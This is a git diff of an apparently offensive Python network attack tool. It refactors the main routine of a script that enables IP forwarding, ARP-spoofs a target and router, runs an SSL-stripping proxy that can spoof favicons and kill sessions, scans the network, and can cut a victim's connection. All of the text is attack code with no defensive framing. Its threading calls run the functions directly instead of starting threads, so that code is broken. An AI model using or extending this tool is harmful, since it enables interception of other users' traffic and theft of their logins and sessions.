@@ -1,7 +1,7 @@
 import scapy.all as scapy
 from scapy.layers import http
 import subprocess
-import netfilterqueue
+#import netfilterqueue
 from strip import Strip
 import getopt
 import logging
@@ -142,15 +142,17 @@ def final_spoof(target_ip, router_ip):
             print("[-] Error While Spoofing the Target")
 
 
-def main(scan, cutNet, iface, redirect):
+def main(argv):
+    (logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet,
+     scan) = parseOptions(argv)
     if scan != "":
-        try:
-            Scanner().run(scan)
-            sleep(2)
-            sys.exit()
-        except Exception:
-            print("[-] Couldn't Scan The Network")
+        Scanner().run(scan)
+        sleep(2)
+        sys.exit()
     else:
+        enable_forward()
+        threading.Thread.start(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions))
+        threading.Thread.start(final_spoof(routerIp, targetIp))
         try:
             if cutNet:
                 queue(cut_net)
@@ -162,8 +164,5 @@ def main(scan, cutNet, iface, redirect):
             print("[-] Error in Final Comparision")
 
 
-(logFile, logLevel, listenPort, spoofFavicon, killSessions, targetIp, iface, redirect, routerIp, cutNet, scan) = parseOptions(sys.argv[1:])
-enable_forward()
-threading.Thread.start(Strip().start(logFile, logLevel, listenPort, spoofFavicon, killSessions))
-threading.Thread.start(final_spoof(routerIp, targetIp))
-threading.Thread.start(main(scan, cutNet, iface, redirect))
+
+main(sys.argv[1:])
